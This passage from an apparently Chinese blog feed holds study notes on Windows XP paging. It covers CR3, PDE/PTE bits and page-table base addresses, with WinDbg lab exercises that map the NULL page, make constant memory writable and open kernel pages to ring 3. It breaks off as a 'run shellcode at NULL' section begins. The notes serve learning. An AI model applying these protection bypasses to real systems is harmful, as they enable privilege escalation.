</span><br><span class="line">  <span class="comment">//ANSI_STRING与UNICODE_STRING字符串相互转换</span></span><br><span class="line">  NtRet = RtlAnsiStringToUnicodeString(&amp;UnicodeStr,&amp;StrSour,TRUE);<span class="comment">//TRUE:是否需要对被转换的字符串分配内存</span></span><br><span class="line">  DbgPrint(<span class="string">&quot;转换返回值：0x%X\n&quot;</span>,NtRet);</span><br><span class="line">  <span class="keyword">if</span>(NtRet == STATUS_SUCCESS)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;转换后内容为：%ws,长度为：%d，最大长度为：%d\n&quot;</span>,UnicodeStr.Buffer,UnicodeStr.Length,UnicodeStr.MaximumLength);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//字符串拷贝</span></span><br><span class="line">  RtlCopyUnicodeString(&amp;UnicodeStrDest,&amp;UnicodeStr);</span><br><span class="line">  DbgPrint(<span class="string">&quot;转换后内容为：%ws,长度为：%d，最大长度为：%d\n&quot;</span>,UnicodeStrDest.Buffer,UnicodeStrDest.Length,UnicodeStrDest.MaximumLength);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">  driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/15/ChkBHEgrOJRMcZa.png" alt="6.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（一）</title>
    <url>/post/WinXP-ProtectionMode-Page/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-CR3和物理内存"><a href="#1-CR3和物理内存" class="headerlink" title="1 CR3和物理内存"></a>1 CR3和物理内存</h2><p>如下指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax,dword ptr ds:[<span class="number">0x12345678</span>]</span><br></pre></td></tr></table></figure>

<div class="note warning"><p>有效地址：0x12345678</p>
<p>线性地址：ds.Base + 0x12345678</p>
<p>物理地址：通过线性地址进行转换得到</p>
</div>

<p>存在内存的DLL会个每个EXE映射一个线性地址，要想通过线性地址找到真正的物理地址，就必须借助于<mark class="label danger">CR3</mark>寄存器。该寄存器存的值是物理地址，<strong>每个进程一个CR3的值，不是一个线程一个CR3的值</strong>。</p>
<p>物理内存的单位：页&#x2F;4KB。</p>
<p>如下， CR3指向一个物理页，一共4096字节：</p>
<p><img data-src="https://s2.loli.net/2021/12/26/b8LFQa7XeZikyPv.png" alt="1.png"></p>
<ul>
<li>第一级：叫做<mark class="label primary">页目录表</mark>，大小1页&#x2F;4KB&#x2F;4096字节&#x2F;1024项。</li>
<li>第二级：叫做<mark class="label warning">页表</mark>，大小1页&#x2F;4KB&#x2F;4096字节&#x2F;1024项。</li>
<li>第三级：真正的<mark class="label default">物理页</mark>内存。</li>
</ul>
<h2 id="2-10-10-12分页模式"><a href="#2-10-10-12分页模式" class="headerlink" title="2 10-10-12分页模式"></a>2 10-10-12分页模式</h2><p>X86模式下存在<mark class="label danger">10-10-12</mark>分页和<mark class="label danger">2-9-9-12</mark>分页来将线性地址转换为物理地址。</p>
<p>10-10-12分页转换规则如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/26/bXnhT8QL7V6NkoD.png" alt="2.png"></p>
<p>转换步骤（0x000AAA40）：</p>
<ol>
<li>修改Windows XP启动配置，将<code>noexecute</code>改成<code>execute</code>，使用10-10-12分页模式。</li>
<li>将线性地址做10-10-12排列：<ul>
<li>10：对应<strong>第一级目录</strong>，0000 0000 00 &#x3D; 0x0</li>
<li>10：对应<strong>第二级页表</strong>，00 1010 1010 &#x3D; 0xAA</li>
<li>12：对应<strong>第三级物理页</strong>，1010 0100 0000 &#x3D; 0xA40</li>
</ul>
</li>
<li>将高地址的两段左移4位（第一和第二张表存的是地址，大小是4字节，所以要乘4）：<ul>
<li>0x0*4 &#x3D; 0x0 </li>
<li>0xAA*4 &#x3D; 0x2A8</li>
</ul>
</li>
<li>根据CR3寄存器的值进行查表，CR3是一个<mark class="label warning">基址</mark>，$Dir&#x3D;CR3+Offset_1*4$，指向第一级目录。</li>
<li>将步骤3得到的地址低12位（属性）置0，然后 PageTable &#x3D; (Dir &amp; 0xFFFFF000) + Offset_2  * 4，指向第二级的页表。</li>
<li>将步骤4得到的地址低12位（属性）置0，然后 Address &#x3D; (PageTable &amp; 0xFFFFF000) + Offset_3 ，即为物理地址。</li>
</ol>
<div class="note default"><p>实际上，把PDT、PTT表堪称两个 <code>DWORD</code> 数组：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD PDT[Num_PDT];</span><br><span class="line">DWORD PTT[Num_PTT];	</span><br><span class="line"><span class="number">1</span>、每一项 PDT[x] 对应一张PTT表，也就是对应一个 PTT[Num_PTT] 数组</span><br><span class="line"><span class="number">2</span>、数组 PDT[Num_PDT] 起始地址为 CR3，<span class="number">32</span>位线性地址的的高<span class="number">10</span>位为数组索引，计算第x项PDE的地址为：CR3+((VirtualAddress&gt;&gt;<span class="number">22</span>)&amp;<span class="number">0x3FF</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure>


</div>

<h2 id="3-练习：查找字符串的物理地址"><a href="#3-练习：查找字符串的物理地址" class="headerlink" title="3 练习：查找字符串的物理地址"></a>3 练习：查找字符串的物理地址</h2><p>题目：打开Notepad.exe输入字符串并查找其对应的物理地址。</p>
<ol>
<li><p>修改Windows XP启动配置，将<code>noexecute</code>改成<code>execute</code>，使用10-10-12分页模式。</p>
</li>
<li><p>CE查看字符串虚拟地址：0x000AAFF8</p>
<p><img data-src="https://s2.loli.net/2021/12/27/QxSmoW6dVAR5jsl.png" alt="3.png"></p>
</li>
<li><p>按10-10-12分页拆分偏移地址：</p>
<ul>
<li>10：0x0*4 &#x3D; 0x0</li>
<li>10：AA*4 &#x3D; 0x2A8</li>
<li>12：0xFF8</li>
</ul>
</li>
<li><p>在Windbg中使用<code>!process 0 0</code>获取当前进程CR3的值：0x15dd4000（物理地址）</p>
<p><img data-src="https://s2.loli.net/2021/12/27/6T1k7wltnp5qgaA.png" alt="4.png"></p>
</li>
<li><p>获取在第一级目录中的值<code>!dd 0x15dd4000+0x0</code>：$Dir&#x3D;CR3+Offset_1*4$ &#x3D; 0x15be1867。</p>
<p><img data-src="https://s2.loli.net/2021/12/27/UrMImVvWu6JT5Gz.png" alt="5.png"></p>
</li>
<li><p>将第一级目录低12位（属性）置0后查偏移，PageTable &#x3D;  (Dir &amp; 0xFFFFF000) + Offset_2  * 4 ，<code>!dd 0x15be1000+0x2A8</code> &#x3D; 0x1609b86。</p>
<p><img data-src="https://s2.loli.net/2021/12/28/odlgAf2OX5B6xqv.png" alt="6.png"></p>
</li>
<li><p>将页表查到的值低12位（属性）置0后查偏移，Address &#x3D; (PageTable &amp; 0xFFFFF000) + Offset_3 ，<code>!db 0x1609b000 + 0xFF8</code> 。</p>
<p><img data-src="https://s2.loli.net/2021/12/28/bsN7o3JtkAmXngT.png" alt="7.png"></p>
</li>
</ol>
<h2 id="4-PDT、PTT表"><a href="#4-PDT、PTT表" class="headerlink" title="4 PDT、PTT表"></a>4 PDT、PTT表</h2><p><img data-src="https://s2.loli.net/2021/12/29/VfSq3JOaevQAwGb.png" alt="8.png"></p>
<p>CR3是唯一一个存储物理地址的寄存器，为第一级页目录表的基址。</p>
<ul>
<li><strong>第一级</strong>：PDT表，<strong>页目录表</strong>，总共1页（4KB&#x3D;4096字节、1000h），每个成员占4字节，每个成员&#x2F;每一项称为<mark class="label success">PDE</mark>，共1024项</li>
<li><strong>第二级</strong>：PTT表，<strong>页表</strong>，总共1页，每一项称为<mark class="label success">PTE</mark>（4字节），共1024项</li>
<li><strong>第三级</strong>：物理页，一个页的大小是4KB，在<strong>同一个物理页地址属性是相同的。</strong></li>
</ul>
<p>10-10-12分页原理：第一级和第二级共1024项，可以使用10位来表示。物理页大小为4KB&#x3D;2^ 12，共需要12位来表示。</p>
<p>10-10-12内存寻址大小：<mark class="label warning">1024*1024*4096=4GB</mark>（当前CPU能识别的物理内存大小）</p>
<div class="note default"><p>PDE和PTE的特征：</p>
<ol>
<li>PTE可以为空（内存还未分配）</li>
<li>多个PTE可以指向同一个物理页</li>
<li>一个PTE仅指向一个物理页</li>
<li>同一个进程中（一个CR3）两个线性地址只要高20位相同，则指向的<strong>物理页相同，只是页内偏移不同</strong></li>
</ol>
</div>

<h2 id="5-练习：挂靠物理页读写NULL地址"><a href="#5-练习：挂靠物理页读写NULL地址" class="headerlink" title="5 练习：挂靠物理页读写NULL地址"></a>5 练习：挂靠物理页读写NULL地址</h2><p>编程中，不能读写NULL，否则会报<code>0xC0000005</code>错误，原因是NULL指针地址的PTE没有对应的物理页，因此，只要我们让NULL指针最终映射到一块可读写的物理页，就可以用NULL去读写数据了。</p>
<p><strong>注意：</strong>如果NULL的PDE项不为0，则直接修改NULL的PTE即可。</p>
<p>只需要将线性地址<code>0x00000000</code>的PTE挂载到变量x对应的物理页上，这样就可以读写了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0x1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量x的线性地址为：%X\n&quot;</span>,&amp;x);</span><br><span class="line">  getchar();	<span class="comment">//在Windbg中获取CR3的值并获取线性地址x的PTE和NULL的PTE</span></span><br><span class="line">  </span><br><span class="line">  *(<span class="keyword">int</span>*)<span class="literal">NULL</span> = <span class="number">0x123</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;NULL地址的值为：%X\n&quot;</span>,*(<span class="keyword">int</span>*)<span class="literal">NULL</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在XP中运行代码如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Jum5B6QLRcYlqvh.png" alt="9.png"></p>
</li>
<li><p>在Windbg中获取当前当前进程CR3的值并找到变量x的PDE、PTE、物理页地址。</p>
<ol>
<li><p>按10-10-12拆分0x0012FF7C：</p>
<ul>
<li>10：0000 0000 00 &#x3D; 0x0 * 4 &#x3D; 0x0；</li>
<li>10：01 0010 1111 &#x3D; 0x12F * 4 &#x3D; 0x4BC；</li>
<li>12：0xF7C。</li>
</ul>
</li>
<li><p>使用<code>!process 0 0</code>获取CR3的值：0x216e8000。</p>
</li>
<li><p><code>!dd 0x216e8000+0x0</code>获取变量x的PDE：PDEx &#x3D; 0x21971867，PTEx &#x3D; 0x21C86867。</p>
</li>
<li><p><code>!dd 0x21971000+0x4BC</code>获取变量x的PTE：PTEx &#x3D; 0x21C86000（去属性），物理地址 &#x3D; 0x21c86F7C。</p>
</li>
<li><p><code>!dd 0x21c86000+0xF7C</code>获取变量x的值：0x1。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Zk3GElOq5DYBJes.png" alt="10.png"></p>
</li>
</ol>
</li>
<li><p>按10-10-12拆分0x00000000，全是0。</p>
<ol>
<li><p><code>!dd 0x216e8000+0x0</code>获取NULL地址的PTE：PDE0 &#x3D; 0x21971867。</p>
</li>
<li><p><code>!dd 0x21971000+0x0</code>获取NULL的物理地址：PTE0 &#x3D; 0x0。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Tc5VkRhidu62mtb.png" alt="11.png"></p>
</li>
</ol>
</li>
<li><p>可以得出：PTEx &#x3D;  0x21C86867，PTE0 &#x3D; 0x0。则将变量x的PTE赋值给NULL的PTE即可，NULL的PDE去属性为：0x21971000，执行<code>!ed 0x21971000 0x21C86867</code>即可。流程如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/Kze9FUY3tPV1jr6.png" alt="12.png"></p>
</li>
<li><p>回到XP中继续执行代码如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/RKvsU42ZWpIGgk1.png" alt="13.png"></p>
</li>
</ol>
<div class="note success"><p><strong>结论：</strong></p>
<p>现在x和NULL的PTE值相同，NULL和x处于同一个物理页，物理页地址范围 0x21C86000～0x21C86FFF，但是二者物理地址仍然是不同的，因为x在物理页内的偏移是 0xF7C，而NULL的偏移是0。</p>
<p>但是没有关系，NULL已经指向了一块可用的物理页了，现在可以对NULL进行读写了。</p>
</div>

<h2 id="6-PDE、PTE属性"><a href="#6-PDE、PTE属性" class="headerlink" title="6 PDE、PTE属性"></a>6 PDE、PTE属性</h2><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"> </p>
<p><img data-src="https://s2.loli.net/2021/12/30/ObrX7mJCiTyBIcY.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/30/74qTRyDSm152OUY.png" alt="16.png"></p>
<p>PDE和PTE的低12位表示物理页的属性。</p>
<mark class="label danger">物理页的属性 = PDE属性 & PTE属性</mark>（除了G位和2-9-9-12的最高XD位，为OR，）

<h3 id="6-1-P位-0"><a href="#6-1-P位-0" class="headerlink" title="6.1 P位[0]"></a>6.1 P位[0]</h3><p>P位（Present）是存在位标志，该标志表明，该表项所指向的页或者页表当前是否在内存中。</p>
<div class="note primary"><ul>
<li>P &#x3D; 1，这个页<strong>在物理内存中</strong>，将执行地址转换。</li>
<li>P &#x3D; 0，表示这个页<strong>不在物理内存中</strong>，如果处理器试图访问该页，将产生一个缺页异常（PF），<code>INT E</code>异常。</li>
</ul>
</div>

<p>处理器并不置位或者清零该位；而是由操作系统来维护该标志的状态。</p>
<p>当P &#x3D; 0时将会触发<code>int e</code>缺页异常，接着操作系统会再去检查PDE和PTE的属性来决定采用以下4种换页方式中的哪一种：</p>
<p>如果处理器产生一个缺页异常，操作系统必须按序执行如下操作：</p>
<ol>
<li>如果有必要，将该页从磁盘拷贝到内存中。</li>
<li>将该页地址装载入页表或者页目录项并设置它的存在标志。其他的位，比如脏<br>位（D位）和访问位，也必须同时被设置。</li>
<li>使TLB中的当前页表项失效。</li>
<li>从缺页异常处理程序返回，重新执行被中断的进程或任务。</li>
</ol>
<h3 id="6-2-R-x2F-W位-1"><a href="#6-2-R-x2F-W位-1" class="headerlink" title="6.2 R&#x2F;W位[1]"></a>6.2 R&#x2F;W位[1]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>R&#x2F;W位（Read&#x2F;Write）读写标志。</p>
<div class="note info"><ul>
<li>R&#x2F;W &#x3D; 1，该页内存<strong>可读可写</strong>。</li>
<li>R&#x2F;W &#x3D; 0，该页内存<strong>只读</strong>。</li>
</ul>
</div>

<p><strong>只有当PDE和PTE的R&#x2F;W位都为1的时候，该物理页才是可读可写的。</strong>R&#x2F;W标志与U&#x2F;S标志和CR0寄存器中的WP标志共同起作用。</p>
<h4 id="6-2-1-练习：修改常量区数据"><a href="#6-2-1-练习：修改常量区数据" class="headerlink" title="6.2.1 练习：修改常量区数据"></a>6.2.1 练习：修改常量区数据</h4><p>C语言中，修改常量区的字符串是不允许的，原因是物理页不具有写权限。</p>
<p>只需要将常量区的线性地址转换后的物理地址的<code>PDE_R/W &amp; PTE_R/W = 1</code>即可。</p>
<p>如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span>* szBuffer = <span class="string">&quot;Const Zone Read/Write&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串的地址为：0x%08X\n&quot;</span>,szBuffer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串为：%s\n&quot;</span>,szBuffer);</span><br><span class="line">  getchar();	<span class="comment">//修改改线性地址转换后的物理地址的PDE、PTE的R/W位为1</span></span><br><span class="line">  </span><br><span class="line">  szBuffer[<span class="number">4</span>] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串为：%s\n&quot;</span>,szBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在XP中运行VC6，得到常量字符串的地址：0x00423054。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/loYHnQ8Zr2PRqbx.png" alt="17.png"></p>
</li>
<li><p>按10-10-12拆分线性地址0x00423054：</p>
<ul>
<li>10：0000 0000 01 &#x3D; 0x1 * 4 &#x3D; 0x4</li>
<li>10：00 0010 0011 &#x3D; 0x23 * 4 &#x3D; 0x8C</li>
<li>12：0x54</li>
</ul>
</li>
<li><p>使用<code>!process 0 0</code>获取CR3的值：0x2d86f000。</p>
</li>
<li><p><code>!dd 0x2d86f000+0x4</code>获取PDE：PDE &#x3D; 0x2e24c867，R&#x2F;W位为1。</p>
</li>
<li><p><code>!dd 0x2e24c000+0x8C</code>获取PTE：PTE &#x3D; 0x2d92f025，R&#x2F;W位为0。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/C3xvlZpuRbkgPyQ.png" alt="18.png"></p>
</li>
<li><p>将PTE的R&#x2F;W位修改为1，<code>!ed 2e24c08c 0x2d92f027</code>。</p>
</li>
<li><p>回到XP中继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/ve68U5VCRWmAihI.png" alt="19.png"></p>
</li>
</ol>
<h3 id="6-3-U-x2F-S位-2"><a href="#6-3-U-x2F-S位-2" class="headerlink" title="6.3 U&#x2F;S位[2]"></a>6.3 U&#x2F;S位[2]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>U&#x2F;S位（User&#x2F;Supervisor），分别为普通用户&#x2F;超级用户。</p>
<div class="note default"><ul>
<li>U&#x2F;S &#x3D; 1，该页权限为<strong>普通用户</strong>可访问。</li>
<li>U&#x2F;S &#x3D; 0，该页权限为<strong>特权用户</strong>可访问。</li>
</ul>
</div>

<p>U&#x2F;S标志与R&#x2F;W标志和CR0寄存器中的WP标志共同起作用。</p>
<p><strong>总结：</strong></p>
<ol>
<li>2G以上是内核才能访问的原因是U&#x2F;S位的设置问题，如果将内核的某个页设置为1就可以在R3访问了。</li>
<li>0、1、2是系统环，<mark class="label success">可以访问系统页和用户页</mark>（0环是特权级环）</li>
<li>1、2环虽然不是特权级环，但是是系统环。</li>
<li>3环是用户环，<mark class="label warning">仅可以访问用户页</mark>。</li>
</ol>
<h4 id="6-3-1-练习：在R3访问高2G内存"><a href="#6-3-1-练习：在R3访问高2G内存" class="headerlink" title="6.3.1 练习：在R3访问高2G内存"></a>6.3.1 练习：在R3访问高2G内存</h4><p>3环的代码仅能访问低2G的原因，是因为高2G的线性地址对应的物理页<code>PDE_U/S &amp; PDE_U/S = 0</code>，修改相应的位使<strong>与</strong>后的结果为1即可在3环访问。</p>
<p>练习：修改一个高2G线性地址的PDE&#x2F;PTE属性，实现Ring3可读写。比如：0x8003F00C</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  PDWORD pR3_Number = (PDWORD)<span class="number">0x8003F00C</span>;</span><br><span class="line">  getchar();	<span class="comment">//进入Windbg修改线性地址0x8003F00C对应的PDE、PTE的U/S位为1</span></span><br><span class="line">  *pR3_Number = <span class="number">12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;地址0x8003F00C存储的值为：%d\n&quot;</span>,*pR3_Number);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>按10-10-12分页拆分线性地址：0x8003F00C</p>
<ul>
<li>10：1000 0000 00 &#x3D; 10 0000 0000 &#x3D; 0x200 * 4 &#x3D; 0x800</li>
<li>10：00 0011 1111 &#x3D; 0x3F * 4 &#x3D; 0xFC</li>
<li>12：0xC</li>
</ul>
</li>
<li><p>在XP的VC6中直接运行代码，报错如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/31/ODxmpZTCLzM2Glf.png" alt="20.png"></p>
</li>
<li><p>重新在XP的VC6中运行代码。</p>
<ol>
<li><code>!process 0 0</code>获取CR3的值：0x3493a000。</li>
<li><code>!dd 0x3493a000+0x800</code>获取PDE的值：0x0003b163，U&#x2F;S位为0。</li>
<li><code>!dd 0x0003b000+0xFC</code>获取PTE的值：0x0003f163，U&#x2F;S位为0。</li>
</ol>
</li>
<li><p>将PDE、PTE的U&#x2F;S位置1。</p>
<ul>
<li><code>!ed 0x3493a800 0x0003b167</code></li>
<li><code>!ed 0x0003b0fc 0x0003f167</code></li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/31/27BaFVOxgfeI1Hv.png" alt="21.png"></p>
</li>
<li><p>回到XP中继续执行代码。</p>
<p>结果仍然还是不能读写高2G的地址，重启了几遍还是没能成功，但是同样的方法，其他人是可以成功的。目前还没有找到解决方法。</p>
<p><strong>已经找到方法解决</strong>：原因是TLB（可以看后面TLB的内容了解TLB），首先看到PDE、PTE中下标8即第9位的G &#x3D; 1。</p>
<ul>
<li>PDE中的PS &#x3D; 0，此时是小页，G位无效。</li>
<li>PTE中的G &#x3D; 1，说明原来的TLB中有线性地址0x8003F00C的缓存（物理地址）。</li>
</ul>
<p>故这里修改后运行失败，若先将PTE的G位清零（<code>invlpg dword ptr ds:[0x8003F00C]</code>），再修改PTE即可成功。</p>
</li>
</ol>
<h3 id="6-4-A位-5"><a href="#6-4-A位-5" class="headerlink" title="6.4 A位[5]"></a>6.4 A位[5]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>A（Accessed）位是标记是否被访问（读或者写）过。访问过置1 即使只访问一个字节也会导致PDE PTE置1</p>
<div class="note warning"><ul>
<li>A &#x3D; 1，该页物理内存<strong>被访问过</strong>。</li>
<li>A &#x3D; 0，该页物理内存<strong>未被访问过</strong>。</li>
</ul>
</div>

<p>这个标志是个“粘性”标志，就是说一旦被设置，处理器不会隐式的给它清零。<br>只有软件能清零该位。内存管理软件使用访问位和脏位（D位）来调度页或者页表进出物理内存。</p>
<h3 id="6-5-D位-PTE-6"><a href="#6-5-D位-PTE-6" class="headerlink" title="6.5 D位(PTE)[6]"></a>6.5 D位(PTE)[6]</h3><p>D位（Dirty）位仅存在于PTE下标为6的位，PDE中该位保留（Reserve），为0。</p>
<div class="note danger"><p>D位指明该页是否曾经被写入过：</p>
<ul>
<li>D &#x3D; 1，该页物理内存<strong>被写入过</strong>。</li>
<li>D &#x3D; 0，该页物理内存<strong>未被被写入过</strong>。</li>
</ul>
<p>内存管理软件使用访问位（A）和脏位（D）来调度页或者页表进出物理内存。</p>
</div>

<p>这个标志是一个粘性标志，就是说，一旦被设置，处理器不会隐式的对它清零。只有软件可以对它清零。</p>
<h3 id="6-6-PS位-PDE-、PAT-PTE-7"><a href="#6-6-PS位-PDE-、PAT-PTE-7" class="headerlink" title="6.6 PS位(PDE)、PAT(PTE)[7]"></a>6.6 PS位(PDE)、PAT(PTE)[7]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><strong>P&#x2F;S位[PDE7]</strong></p>
<p>P&#x2F;S位（Page Size）确定页的大小，仅对PDE有意义。</p>
<div class="note warning"><ul>
<li>P&#x2F;S &#x3D; 1，页大小为<strong>4MB</strong>，此时不存在页表，低22位为一页（1024*4096）。</li>
<li>P&#x2F;S &#x3D; 0，页大小为<strong>4KB</strong>。</li>
</ul>
<p>P&#x2F;S &#x3D; 1时，线性地址只能拆成2段：大小为4MB ，俗称“大页”。</p>
</div>

<p><strong>PAT位[PTE7]</strong></p>
<p>PAT位（Page Table Attribute Index）页属性表，在奔腾I处理器中采用这个标志用来选择PAT项。</p>
<div class="note default"><ul>
<li>PAT &#x3D; 1，这个标志与PCD和PWT标志一起，被用来选取PAT项。</li>
<li>PAT &#x3D; 0，<strong>该位目前保留</strong>。</li>
</ul>
</div>

<h3 id="6-7-G-8-、PET-3-、PCD-4"><a href="#6-7-G-8-、PET-3-、PCD-4" class="headerlink" title="6.7 G[8]、PET[3]、PCD[4]"></a>6.7 G[8]、PET[3]、PCD[4]</h3><p>学完控制寄存器与TLB才能讲，此处略过。</p>
<h3 id="6-8-有效位-9-10-11"><a href="#6-8-有效位-9-10-11" class="headerlink" title="6.8 有效位[9 10 11]"></a>6.8 有效位[9 10 11]</h3><p>有效位在发生缺页时（<strong>PTE的P&#x3D;0</strong>）使用。分以下四种情况（具体可见内存管理-无处不在的缺页异常）。关于这部分知识，等以后学习了内存管理的缺页异常就知道了，这里简单介绍一下。</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/01/JLsmQIGSwDN4YlA.png" alt="22.png"></p>
<h2 id="7-页目录表基址"><a href="#7-页目录表基址" class="headerlink" title="7 页目录表基址"></a>7 页目录表基址</h2><p>CR3中存储的是物理地址，不能在程序中直接读取的。如果想读取，也要把CR3的值挂到PDT和PTT中才能访问，那么怎么通过线性地址访问PDT和PTT呢？</p>
<div class="note default"><p>在10-10-12分页模式下的PDT表：</p>
<ol>
<li>PDT表实际上是PTT表中的一张表，刚好是第0x300张。</li>
<li>PDT表共1024个PDE项，每一项指向一张PTT表，其中第0x300项PDE指向自身。</li>
<li>在代码中可以通过线性地址<code>0xC0300000</code>来得到PDT表的基址。</li>
</ol>
</div>

<p><img data-src="https://s2.loli.net/2022/01/02/ukwKTxjbW3BUSfm.png" alt="23.png"></p>
<div class="note warning"><p>关于PDT表的基址有以下结论：</p>
<ol>
<li>通过线性地址<mark class="label danger">0xC0300000</mark>找到的物理页就是<strong>页目录表</strong>。</li>
<li>这个物理页即是页目录表本身也是页表，PDT表实际上就是PTT表中的一张。</li>
<li>页目录表是一张特殊的页表，每一项PTE指向的不是普通的物理页，而是指向其他的页表。</li>
<li>如果我们要访问第N个PDE，那么有如下公式：$0xC0300000 + N*4 $ 。</li>
</ol>
</div>



<h2 id="8-页表基址"><a href="#8-页表基址" class="headerlink" title="8 页表基址"></a>8 页表基址</h2><p>既然有线性地址<mark class="label warning">0xC0300000</mark>指向PDT，且它是PTT表的第0x300张，一张表大小为1000h。则线性地址<mark class="label warning">0xC0000000</mark>指向PTT表的基址。</p>
<p>则地址0xC0001000为第2张PTT表，到Windbg中查确实如此。</p>
<div class="note success"><p>在10-10-12分页模式下的PTT表：</p>
<ol>
<li>页表被映射到了从0xC0000000到0xC03FFFFF的4M地址空间。</li>
<li><strong>1024张页表的线性地址是连续的，但物理地址不连续</strong></li>
<li>在这1024个表中有一张特殊的表：<strong>页目录表</strong>。</li>
<li>页目录被映射到了0xC0300000开始处的4K地址空间。</li>
</ol>
</div>

<p><strong>关于PDT、PTT表的结论：</strong></p>
<p>掌握了这两个地址，就掌握了一个进程所有的物理内存读写权限。</p>
<div class="note danger"><p><strong>公式：</strong></p>
<ol>
<li>什么是PDI与PTI：10-10-12 <ul>
<li>10：PDI</li>
<li>10：PTI</li>
</ul>
</li>
<li>访问页目录表项(PDE)的公式：$0xC0300000 + PDI*4$</li>
<li>访问页表项(PTE)的公式：$0xC0000000 + PDI*4096 + PTI*4$</li>
</ol>
</div>



<h2 id="9-练习：在NULL地址执行ShellCode"><a href="#9-练习：在NULL地址执行ShellCode" class="headerlink" title="9 练习：在NULL地址执行ShellCode"></a>9 练习：在NULL地址执行ShellCode</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = &#123;<span 